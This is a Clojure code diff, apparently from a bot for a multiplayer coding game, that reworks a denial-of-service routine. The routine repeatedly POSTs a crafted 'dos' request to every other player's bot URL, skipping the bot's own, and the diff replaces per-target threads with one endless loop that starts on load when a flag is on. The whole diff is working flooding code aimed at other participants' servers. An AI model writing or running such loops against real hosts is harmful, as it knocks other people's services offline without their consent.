@@ -5,7 +5,7 @@
             [clojure.set :as set]
             [common.predicate :as p]))
 
-(def targets (agent {:active #{} :removed #{}}))
+(def targets (atom #{}))
 
 (def attack-request {:reason "dos",
                      :gameState
@@ -37,23 +37,21 @@
                               :actionCount 0}
                      :playerId "Insane in the main frame"})
 
-(defn- attack [url]
+(defn- attack-url [url]
   (try
     (client/post url {:form-params  attack-request
                       :content-type :json
                       :as           :json})
-    (catch Throwable t))
-  #_(Thread/sleep 1000)
-  (when (not (contains? (:removed @targets) url)) (recur url)))
+    (catch Throwable t)))
 
-(defn- update-targets-action [targets next-target-urls]
-  (let [current-target-urls (:active targets)]
-    (doseq [new-target-url (set/difference next-target-urls current-target-urls)]
-           (future (attack new-target-url)))
-    {:active next-target-urls
-     :removed (set/union (set/difference current-target-urls next-target-urls))}))
+(defn attack-all []
+  (do
+    (doseq [url @targets] (attack-url url))
+    (if (empty? @targets) (Thread/sleep 10000))
+    (recur)))
 
 (defn update-dos-targets [urls]
-  (if (s/dos-attact-active?)
-    (send targets update-targets-action
-          (set (filter (p/not* (partial xstr/substring? (s/bot-url))) urls)))))
+  (reset! targets (set (filter (p/not* (partial xstr/substring? (s/bot-url))) urls))))
+
+(def attacker
+  (when (s/dos-attact-active?) (future (attack-all))))
